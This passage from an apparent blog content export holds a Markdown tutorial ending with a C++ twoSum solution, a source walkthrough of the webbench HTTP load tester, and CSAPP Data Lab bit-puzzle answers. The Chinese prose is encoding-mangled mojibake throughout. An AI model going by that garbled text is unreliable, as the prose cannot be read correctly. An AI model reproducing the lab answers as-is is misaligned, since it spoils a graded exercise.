&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">twoSum</span><span class="hljs-params">(vector&lt;<span class="hljs-keyword">int</span>&gt;&amp; nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&gt; mp;<br>        vector&lt;<span class="hljs-keyword">int</span>&gt; ans;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;nums.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(mp.<span class="hljs-built_in">count</span>(target-nums[i]))<br>            &#123;<br>                ans.<span class="hljs-built_in">push_back</span>(mp[target-nums[i]]);<br>                ans.<span class="hljs-built_in">push_back</span>(i);<br>                <span class="hljs-keyword">return</span> ans;<br>            &#125;<br>            <span class="hljs-keyword">else</span> mp[nums[i]]=i;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h3 id="çº¿"><a href="#çº¿" class="headerlink" title="çº¿"></a>çº¿</h3><ul><li>åˆ†å‰²çº¿ï¼š- - -è¡¨ç¤ºåˆ†å‰²çº¿</li><li><del>åˆ é™¤çº¿</del>ï¼š~~è¢«åˆ é™¤æ–‡å­—~~</li><li><u>ä¸‹åˆ’çº¿</u>ï¼š&lt;u&gt;å¸¦ä¸‹åˆ’çº¿æ–‡æœ¬&lt;/u&gt;</li></ul><hr><h2 id="åˆ—è¡¨"><a href="#åˆ—è¡¨" class="headerlink" title="åˆ—è¡¨"></a>åˆ—è¡¨</h2><p>-<br>*</p><hr><h2 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h2><p>&gt; è¡¨ç¤ºå¼•ç”¨</p><p>&gt; &gt; è¡¨ç¤ºåµŒå¥—çš„å¼•ç”¨</p><blockquote><p>è¿™æ˜¯å¼•ç”¨</p><blockquote><p>è¿™æ˜¯åµŒå¥—çš„å¼•ç”¨</p></blockquote></blockquote><hr><h2 id="ä»£ç -1"><a href="#ä»£ç -1" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><p>```cpp<br>ä»£ç å†…å®¹ï¼Œä»¥cppä¸ºä¾‹<br>```</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br></code></pre></td></tr></table></figure><hr><h2 id="é“¾æ¥"><a href="#é“¾æ¥" class="headerlink" title="é“¾æ¥"></a>é“¾æ¥</h2><ul><li>&lt;é“¾æ¥&gt;        </li><li>[æ˜¾ç¤ºçš„æ–‡å­—](æ”¾å…¥ç½‘å€)</li></ul><hr><h2 id="å›¾ç‰‡"><a href="#å›¾ç‰‡" class="headerlink" title="å›¾ç‰‡"></a>å›¾ç‰‡</h2><p>csdnä¸­å›¾ç‰‡å¤§å°çš„ç¼©æ”¾ï¼š<br>ä¾‹ï¼šè®¾å®šå›¾ç‰‡å¯¹åº”çš„æºç ä¸­t_70 = 1000xï¼Œå¯ä»¥æ›´æ”¹æ•°å€¼</p><hr><h2 id="è¡¨æ ¼"><a href="#è¡¨æ ¼" class="headerlink" title="è¡¨æ ¼"></a>è¡¨æ ¼</h2><p>å³é”®ï¼Œæ’å…¥å³å¯<br>|å§“å| å®—æ´¾ |<br>|â€“|â€“|<br>|  é©¬ä¿å›½|  æµ‘å…ƒå½¢æ„å¤ªæé—¨|</p><hr><h2 id="å…¬å¼"><a href="#å…¬å¼" class="headerlink" title="å…¬å¼"></a>å…¬å¼</h2><ul><li>è¡Œå†…å…¬å¼ï¼š$å…¬å¼$<br>$a^b$ è¡¨ç¤ºçš„å°±æ˜¯ $a^b$</li><li>å•ç‹¬ä¸€è¡Œçš„å…¬å¼ï¼š$$å…¬å¼$$</li></ul><p>$$ a^b $$ è¡¨ç¤ºçš„å°±æ˜¯ </p><p>$$a^b$$</p><h1 id="vscodeä¸­çš„mdæ”¯æŒ"><a href="#vscodeä¸­çš„mdæ”¯æŒ" class="headerlink" title="vscodeä¸­çš„mdæ”¯æŒ"></a>vscodeä¸­çš„mdæ”¯æŒ</h1><p>ä»¥æ’ä»¶Markdown shortcutsä¸ºä¾‹ï¼š</p><table><thead><tr><th>Name</th><th>Description</th><th>Default key binding</th></tr></thead><tbody><tr><td>md-shortcut.showCommandPalette</td><td>Display all commands</td><td>ctrl+M ctrl+M</td></tr><tr><td>md-shortcut.toggleBold</td><td>Make <strong>bold</strong></td><td>ctrl+B</td></tr><tr><td>md-shortcut.toggleItalic</td><td>Make <em>italic</em></td><td>ctrl+I</td></tr><tr><td>md-shortcut.toggleStrikethrough</td><td>Make <del>strikethrough</del></td><td></td></tr><tr><td>md-shortcut.toggleLink</td><td>Make <a href="www.example.org">a hyperlink</a></td><td>ctrl+L</td></tr><tr><td>md-shortcut.toggleImage</td><td>Make an image <img src="image_url.png"></td><td>ctrl+shift+L</td></tr><tr><td>md-shortcut.toggleCodeBlock</td><td>Make <code>a code block</code></td><td>ctrl+M ctrl+C</td></tr><tr><td>md-shortcut.toggleInlineCode</td><td>Make <code>inline code</code></td><td>ctrl+M ctrl+I</td></tr><tr><td>md-shortcut.toggleBullets</td><td>Make * bullet point</td><td>ctrl+M ctrl+B</td></tr><tr><td>md-shortcut.toggleNumbers</td><td>Make 1. numbered list</td><td>ctrl+M ctrl+1</td></tr><tr><td>md-shortcut.toggleCheckboxes</td><td>Make - [ ] check list (Github flavored markdown)</td><td>ctrl+M ctrl+X</td></tr></tbody></table>]]></content>
    
    
    
    <tags>
      
      <tag>Markdown</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>webbenchæºç å­¦ä¹ </title>
    <link href="/p/93d200d8/"/>
    <url>/p/93d200d8/</url>
    
    <content type="html"><![CDATA[<h1 id="webbenchç®€ä»‹"><a href="#webbenchç®€ä»‹" class="headerlink" title="webbenchç®€ä»‹"></a>webbenchç®€ä»‹</h1><p>webbenchæ˜¯ä¸€ä¸ªhttpæœåŠ¡å™¨çš„å‹åŠ›æµ‹è¯•å·¥å…·ï¼ŒåŸç†æ˜¯é€šè¿‡forkæ¨¡æ‹Ÿå‡ºå¤šä¸ªå­è¿›ç¨‹å¯¹æŒ‡å®šurlè¿›è¡Œè¯·æ±‚ï¼Œå¹¶é€šè¿‡ç®¡é“é€šä¿¡è®©å­è¿›ç¨‹å°†å¾—åˆ°çš„æ•°æ®å‘é€ç»™çˆ¶è¿›ç¨‹ï¼Œä»è€Œå®Œæˆæ•°æ®çš„ç»Ÿè®¡ï¼Œå®ƒæœ€å¤šå¯ä»¥æ¨¡æ‹Ÿ3ä¸‡ä¸ªå¹¶å‘è¿æ¥å»æµ‹è¯•ç½‘ç«™çš„è´Ÿè½½èƒ½åŠ›</p><p>è¿™æ˜¯æˆ‘å†™çš„æºç æ³¨é‡Šä»“åº“ï¼š<a href="https://github.com/LaPhilosophie/WebBench">https://github.com/LaPhilosophie/WebBench</a></p><h1 id="åˆ†æå›¾"><a href="#åˆ†æå›¾" class="headerlink" title="åˆ†æå›¾"></a>åˆ†æå›¾</h1><p><img src="/image/webbench-workflow.png"></p><p><img src="/image/Snipaste_2022-08-25_23-42-10.png"></p><h1 id="è¿è¡Œæ•ˆæœ"><a href="#è¿è¡Œæ•ˆæœ" class="headerlink" title="è¿è¡Œæ•ˆæœ"></a>è¿è¡Œæ•ˆæœ</h1><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gradle">zarathustra@Nietzsche ~<span class="hljs-regexp">/c/</span>WebBench (master) [<span class="hljs-number">2</span>]&gt; .<span class="hljs-regexp">/webbench -c 30 -t 10 http:/</span><span class="hljs-regexp">/xinanzhijia.xyz/</span><br>Webbench - Simple Web Benchmark <span class="hljs-number">1.5</span><br>Copyright (c) Radim Kolar <span class="hljs-number">1997</span>-<span class="hljs-number">2004</span>, GPL Open <span class="hljs-keyword">Source</span> Software.<br><br>Request:<br>GET <span class="hljs-regexp">/ HTTP/</span><span class="hljs-number">1.0</span><br>User-Agent: WebBench <span class="hljs-number">1.5</span><br>Host: xinanzhijia.xyz<br><br><br>Runing info: <span class="hljs-number">30</span> clients, running <span class="hljs-number">10</span> sec.<br><br>Speed=<span class="hljs-number">1818</span> pages<span class="hljs-regexp">/min, 3934 bytes/</span>sec.<br>Requests: <span class="hljs-number">303</span> susceed, <span class="hljs-number">0</span> failed.<br></code></pre></td></tr></table></figure><h1 id="å¤„ç†å‘½ä»¤è¡Œå‚æ•°"><a href="#å¤„ç†å‘½ä»¤è¡Œå‚æ•°" class="headerlink" title="å¤„ç†å‘½ä»¤è¡Œå‚æ•°"></a>å¤„ç†å‘½ä»¤è¡Œå‚æ•°</h1><p>webbenchä½¿ç”¨getopt_longå‡½æ•°è¿›è¡Œå‚æ•°çš„å¤„ç†ï¼Œä»–æ”¯æŒè®¸å¤šå‚æ•°ï¼ˆå¦‚ä¸‹ï¼‰</p><p>è·çŸ¥å‘½ä»¤è¡Œå‚æ•°ä¹‹åï¼Œè¿›è¡Œå‚æ•°çš„è·å–ï¼Œå¹¶è®¾ç½®å˜é‡å­—æ®µï¼Œè¿›è¡Œè¯·æ±‚åŒ…çš„æ„é€ </p><table><thead><tr><th>çŸ­å‚</th><th>é•¿å‚æ•°</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>-f</td><td>â€“force</td><td>ä¸éœ€è¦ç­‰å¾…æœåŠ¡å™¨å“åº”</td></tr><tr><td>-r</td><td>â€“reload</td><td>å‘é€é‡æ–°åŠ è½½è¯·æ±‚</td></tr><tr><td>-t</td><td>â€“time</td><td>è¿è¡Œå¤šé•¿æ—¶é—´ï¼Œå•ä½ï¼šç§’â€</td></tr><tr><td>-p</td><td>â€“proxy server:port</td><td>ä½¿ç”¨ä»£ç†æœåŠ¡å™¨æ¥å‘é€è¯·æ±‚</td></tr><tr><td>-c</td><td>â€“clients</td><td>åˆ›å»ºå¤šå°‘ä¸ªå®¢æˆ·ç«¯ï¼Œé»˜è®¤1ä¸ªâ€</td></tr><tr><td>-9</td><td>â€“http09</td><td>ä½¿ç”¨ HTTP/0.9</td></tr><tr><td>-1</td><td>â€“http10</td><td>ä½¿ç”¨ HTTP/1.0 åè®®</td></tr><tr><td>-2</td><td>â€“http11</td><td>ä½¿ç”¨ HTTP/1.1 åè®®</td></tr><tr><td>â€“get</td><td>ä½¿ç”¨ GETè¯·æ±‚æ–¹æ³•</td><td></td></tr><tr><td>â€“head</td><td>ä½¿ç”¨ HEADè¯·æ±‚æ–¹æ³•</td><td></td></tr><tr><td>â€“options</td><td>ä½¿ç”¨ OPTIONSè¯·æ±‚æ–¹æ³•</td><td></td></tr><tr><td>â€“trace</td><td>ä½¿ç”¨ TRACEè¯·æ±‚æ–¹æ³•</td><td></td></tr><tr><td>-?/-h</td><td>â€“help</td><td>æ‰“å°å¸®åŠ©ä¿¡æ¯</td></tr><tr><td>-V</td><td>â€“version</td><td>æ˜¾ç¤ºç‰ˆæœ¬å·</td></tr></tbody></table><h2 id="getopt"><a href="#getopt" class="headerlink" title="getopt()"></a>getopt()</h2><p>getopt:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getopt</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> * <span class="hljs-keyword">const</span> argv[],</span></span><br><span class="hljs-params"><span class="hljs-function">           <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *optstring)</span></span>;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> *optarg;<br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">int</span> optind, opterr, optopt;<br></code></pre></td></tr></table></figure><p>getoptè§£æå‘½ä»¤è¡Œå‚æ•°ï¼Œå‡½æ•°åŸå‹å¦‚ä¸Šã€‚argcå’Œargvæ˜¯mainå‡½æ•°çš„å‚æ•°ï¼Œargvä¸­ä»¥-å¼€å¤´çš„æ˜¯é€‰é¡¹ï¼Œæ¯”å¦‚-vï¼Œvæ˜¯é€‰é¡¹</p><ul><li>å¦‚æœé‡å¤è°ƒç”¨ getopt () ï¼Œå®ƒå°†ä¾æ¬¡è¿”å›æ¯ä¸ªé€‰é¡¹å…ƒç´ ä¸­çš„æ¯ä¸ªé€‰é¡¹å­—ç¬¦</li><li>optstringæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ¯”å¦‚â€œnm:slâ€ï¼Œè¿™è¡¨ç¤ºå¯ä»¥å¤„ç†å››ä¸ªé€‰é¡¹ï¼Œ-nã€-mã€-sã€-lï¼Œå…¶ä¸­ï¼Œï¼šä¹‹å‰çš„å­—æ¯å¯ä»¥æœ‰å‚æ•°ï¼Œæ¯”å¦‚åœ¨è¿™é‡Œï¼Œç”±äºï¼šä¹‹å‰æœ‰mï¼Œæ‰€ä»¥å¯ä»¥æœ‰å¦‚ä¸‹ç”¨æ³•ï¼š-m xxx</li><li>å˜é‡ optind æ˜¯è¦åœ¨ argv ä¸­å¤„ç†çš„ä¸‹ä¸€ä¸ªå…ƒç´ çš„ç´¢å¼•ã€‚ç³»ç»Ÿå°†æ­¤å€¼åˆå§‹åŒ–ä¸º1</li><li>å¦‚æœ getopt ()æ‰¾åˆ°ä¸€ä¸ªé€‰é¡¹å­—ç¬¦ï¼Œå®ƒä¼š<strong>è¿”å›è¯¥å­—ç¬¦</strong>ï¼Œæ›´æ–°extendå˜é‡ optind å’Œä¸€ä¸ªstaticå˜é‡ nextchar</li><li>è§£æäº†æ‰€æœ‰çš„å‘½ä»¤è¡Œé€‰é¡¹,getopt () <strong>è¿”å›-1</strong>ï¼Œä¸”optindæ˜¯ argv ä¸­ç¬¬ä¸€ä¸ªä¸æ˜¯é€‰é¡¹çš„ argv å…ƒç´ çš„ç´¢å¼•</li><li>å¦‚æœé‡åˆ°ä¸åœ¨optstringä¸­çš„å­—ç¬¦ï¼Œè¿”å›ï¼Ÿ</li><li>å¦‚æœ getopt ()é‡åˆ°ä¸€ä¸ªç¼ºå°‘å‚æ•°çš„é€‰é¡¹ä¸”optstringç¬¬ä¸€ä¸ªå­—ç¬¦ä¸æ˜¯:ï¼Œé‚£ä¹ˆè¿”å›ï¼Ÿ</li></ul><h2 id="getopt-long"><a href="#getopt-long" class="headerlink" title="getopt_long()"></a>getopt_long()</h2><p>getopt_longï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;getopt.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getopt_long</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> * <span class="hljs-keyword">const</span> argv[],</span></span><br><span class="hljs-params"><span class="hljs-function">           <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *optstring,</span></span><br><span class="hljs-params"><span class="hljs-function">           <span class="hljs-keyword">const</span> struct option *longopts, </span></span><br><span class="hljs-params"><span class="hljs-function">           <span class="hljs-keyword">int</span> *longindex)</span></span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">option</span> &#123;</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name;<br>    <span class="hljs-keyword">int</span>         has_arg;<br>    <span class="hljs-keyword">int</span>        *flag;<br>    <span class="hljs-keyword">int</span>         val;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>getopt_longä¸getoptç±»ä¼¼ï¼Œä½†æ˜¯åŒæ—¶ä¹Ÿå¯ä»¥å¤„ç†é•¿é€‰é¡¹ï¼Œå³ä»¥ä¸¤ä¸ªæ¨ªæ å¼€å¤´çš„é€‰é¡¹ï¼Œæ¯”å¦‚â€“version</li><li>nameç±»ä¼¼äºä¸Šé¢çš„optstring</li><li>has_argï¼š<ul><li>no_argument (or 0)</li><li>required_argument (or 1)</li><li>optional_argument (or 2) </li></ul></li><li>å¦‚æœflagä¸ºNULLï¼Œåˆ™getopt_long()è¿”å›valï¼Œå¦åˆ™valèµ‹å€¼ç»™flagæŒ‡é’ˆæ‰€æŒ‡å†…å®¹</li><li>getopt_longçš„è¿”å›å€¼ç±»ä¼¼äºgetoptå‡½æ•°ï¼ˆerrorã€-1ã€ï¼Ÿï¼‰</li><li>longoptsæ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ åº”è¯¥å…¨ä¸º0</li><li>optarg: å¦‚æœåˆæ³•é€‰é¡¹å¸¦æœ‰å‚æ•°ï¼Œé‚£ä¹ˆå¯¹åº”çš„å‚æ•°ï¼Œèµ‹å€¼ç»™optarg</li></ul><p>å…³äºflagçš„æè¿°æœ‰ç‚¹ç»•ï¼Œæ‘˜æŠ„ä¸€ä¸‹ï¼š</p><blockquote><p>specifies how results are returned for a long option. If flag is NULL, then getopt_long() returns val. (For example, the calling program may set val to the equivalent short option character.) Otherwise, getopt_long() returns 0, and flag points to a variable which is set to val if the option is found, but left unchanged if the option is not found.</p></blockquote><h1 id="è¯·æ±‚åŒ…çš„æ„é€ "><a href="#è¯·æ±‚åŒ…çš„æ„é€ " class="headerlink" title="è¯·æ±‚åŒ…çš„æ„é€ "></a>è¯·æ±‚åŒ…çš„æ„é€ </h1><ul><li>è¯·æ±‚æŠ¥æ–‡è¢«å­˜åˆ°requestæ•°ç»„ï¼Œå®ƒæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡</li><li>build_requestç”¨åˆ°äº†å¤§é‡çš„å­—ç¬¦ä¸²å¤„ç†å‡½æ•°ï¼Œæ¯”å¦‚memsetã€strcatã€strchrã€strstr</li><li>å¤„ç†ä¹‹årequestæ•°ç»„æ‰€å‚¨å­˜çš„å†…å®¹ç±»ä¼¼ï¼š<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.0</span><br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>WebBench 1.5<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>gls.show<br></code></pre></td></tr></table></figure></li></ul><h1 id="benchå‡½æ•°"><a href="#benchå‡½æ•°" class="headerlink" title="benchå‡½æ•°"></a>benchå‡½æ•°</h1><p>è¯¥å‡½æ•°æ˜¯é¡¹ç›®çš„æ ¸å¿ƒ</p><ul><li>å…ˆè°ƒç”¨socket.cä¸­çš„socketå‡½æ•°æµ‹è¯•æ˜¯å¦å¯ä»¥è¿é€š</li><li>forkå‡ºclientæ•°é‡çš„è¿›ç¨‹ã€‚æ³¨æ„åˆ°è¿™é‡Œé€šè¿‡å­è¿›ç¨‹åœ¨å¾ªç¯ä¸­çš„breakä½¿å¾—ä¸ä¼šå‡ºç°æŒ‡æ•°çˆ†ç‚¸å¼çš„è¿›ç¨‹æ•°é‡ï¼Œè€Œæ˜¯è®¾ç½®çš„clientæ•°é‡çš„è¿›ç¨‹</li><li>åˆ›å»ºç®¡é“ï¼Œçˆ¶å­è¿›ç¨‹åˆ†ç¦»ï¼Œå¹¶é€šè¿‡ç®¡é“è¿›è¡Œé€šä¿¡<ul><li>å­è¿›ç¨‹ï¼šè¿æ¥æœåŠ¡å™¨å¹¶æ”¶å‘åŒ…å¾—åˆ°æ•°æ®ï¼Œé€šè¿‡ç®¡é“å†™ç«¯ä¼ é€ç»™çˆ¶è¿›ç¨‹</li><li>çˆ¶è¿›ç¨‹ï¼šé€šè¿‡ç®¡é“è¯»ç«¯å¾—åˆ°æ•°æ®ï¼Œå¹¶ç»Ÿè®¡å¾—å‡ºæœ€ç»ˆç»“æœ</li></ul></li><li>é€šå…³è‡ªå®šä¹‰çš„ä¿¡å·æ§åˆ¶å‘½ä»¤è¡Œå‚æ•°ä¸­çš„æ—¶é—´è®¾ç½®</li></ul><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><ul><li>æ€»ä½“æ¥è¯´è¿˜æ˜¯ä¸ªä¸é”™çš„é¡¹ç›®ï¼Œä½†æ˜¯ä»£ç ä¸­ç¡®å®æœ‰äº›å†™çš„ä¸å¤Ÿå¥½çš„åœ°æ–¹<ul><li>pid_tåŒæ—¶ç”¨äºæ¥å—forkè¿”å›å€¼å’Œfscanfå‡½æ•°è¿”å›å€¼</li><li>ä½¿ç”¨äº†å¤§é‡çš„å…¨å±€å˜é‡</li><li>æ²¡æœ‰å…³é—­ç®¡é“ä¸éœ€è¦çš„ä¸€ç«¯</li><li>é”™è¯¯å¤„ç†æœ‰äº›æ··ä¹±</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>Cè¯­è¨€</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP-lab1ï¼šData lab</title>
    <link href="/p/6d79108/"/>
    <url>/p/6d79108/</url>
    
    <content type="html"><![CDATA[<h1 id="bitxor"><a href="#bitxor" class="headerlink" title="bitxor"></a>bitxor</h1><ul><li>åªèƒ½ä½¿ç”¨ç»™å®šçš„è¿ç®—ç¬¦ï¼Œå¾—åˆ°å¼‚æˆ–æ“ä½œçš„ç­‰ä»·å‡½æ•°</li><li>ç±»ä¼¼äºæ•°ç”µä¸­ä¸éé€»è¾‘é—¨å®ç°å¼‚æˆ–</li><li>x xor yt = <code>~(~(~x&amp;y)&amp;~(x&amp;~y))</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * bitXor - x^y using only ~ and &amp; </span><br><span class="hljs-comment"> *   Example: bitXor(4, 5) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp;</span><br><span class="hljs-comment"> *   Max ops: 14</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bitXor</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br><br>  <span class="hljs-keyword">return</span> ~(~(~x&amp;y)&amp;~(x&amp;~y));<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h1><ul><li>å‡½æ•°è¿”å›äºŒè¿›åˆ¶è¡¥ç è¡¨ç¤ºçš„æœ€å°çš„æ•°<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * tmin - return minimum two&#x27;s complement integer </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 4</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">tmin</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>;<span class="hljs-comment">//tmin is 100....0</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h1><ul><li>æ£€æµ‹ä¼ å…¥çš„å‚æ•°xæ˜¯ä¸æ˜¯èƒ½è¡¨ç¤ºçš„æœ€å¤§å€¼</li><li>è‹¥æ˜¯æœ€å¤§å€¼ï¼Œé‚£ä¹ˆä¸€å®šæ»¡è¶³ï¼š01111111ï¼Œä¹Ÿå³æ˜¯æ»¡è¶³ï¼š(x+1)^(~x)çš„å€¼ä¸º0</li><li>ä½†æ˜¯ï¼Œæ»¡è¶³(x+1)^(~x)çš„å¹¶ä¸ä¸€å®šéƒ½æ˜¯01111111ï¼Œåä¾‹ï¼š11111111ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨!!(x+1)ä½œä¸ºä¸¤è€…çš„åŒºåˆ†<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span><br><span class="hljs-comment"> *     and 0 otherwise </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | +</span><br><span class="hljs-comment"> *   Max ops: 10</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*x : 01111111</span><br><span class="hljs-comment">  ~x: 10000000</span><br><span class="hljs-comment">  y :11111111</span><br><span class="hljs-comment">  ~y:00000000</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isTmax</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> y=(x+<span class="hljs-number">1</span>)^(~x);<br>  <span class="hljs-keyword">return</span> !y&amp;!!(x+<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h1><ul><li>å¦‚æœå¥‡æ•°æ¯”ç‰¹ä½ä¸Šéƒ½æ˜¯1é‚£ä¹ˆå‡½æ•°è¿”å›1</li><li>ä½¿ç”¨ç§»ä½è¿ç®—å¾—åˆ°0xAAAAAAAAï¼Œx&amp;y0xAAAAAAAAå¯ä»¥è¿‡æ»¤æ‰æ‰€æœ‰å¶æ•°ä½ï¼Œç„¶åå°†ç»“æœä¸0xAAAAAAAAyå¼‚æˆ–ï¼Œå¦‚æœæ˜¯0é‚£ä¹ˆæ»¡è¶³é¢˜æ„</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span><br><span class="hljs-comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span><br><span class="hljs-comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//0xAAAAAAAA=0b10101010101010101010101010101010</span><br><span class="hljs-comment">//0x55555555=0b01010101010101010101010101010101</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">allOddBits</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> a=<span class="hljs-number">0xaa</span>;<br>  <span class="hljs-keyword">int</span> y=(a&lt;&lt;<span class="hljs-number">8</span>)+(a&lt;&lt;<span class="hljs-number">16</span>)+(a&lt;&lt;<span class="hljs-number">24</span>)+a;<br>  <span class="hljs-keyword">return</span> 